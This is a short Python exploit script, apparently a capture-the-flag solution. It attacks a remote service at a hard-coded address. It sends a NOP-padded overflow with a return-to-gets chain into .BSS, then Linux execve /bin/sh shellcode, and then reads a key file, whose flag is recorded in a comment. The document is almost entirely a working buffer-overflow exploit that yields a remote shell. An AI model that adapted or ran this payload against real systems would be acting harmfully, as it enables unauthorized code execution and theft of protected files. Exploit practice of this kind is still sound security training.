#!/usr/bin/env python
from socket import *
from telnetlib import *
from struct import pack
import time

SERVER = ("125.138.166.183", 14321)

s = socket(AF_INET, SOCK_STREAM)
s.connect(SERVER)
t = Telnet()
t.sock = s

# Linux 32Bit :: execve /bin/sh - 21Bytes
sc = "\x6A\x0B\x58\x99\x52\x68\x2F\x2F\x73\x68"     + \
	 "\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\xCD\x80"

print t.read_until("> ")
s.send("1\n")

p  = "\x90" * 528
p += pack("<I", 0x08048590) # gets@plt
p += pack("<I", 0x0804a084) # .BSS ; ret
p += pack("<I", 0x0804a084) # .BSS ; gets(&.BSS)

print t.read_until(": ");
s.send(p + "\n")
s.send(sc + "\n")

time.sleep(1)

s.send("cat /home/unlock/key\n")
# key_is_I_C4n_ov3rflow:)

print s.recv(1024)
print s.recv(1024)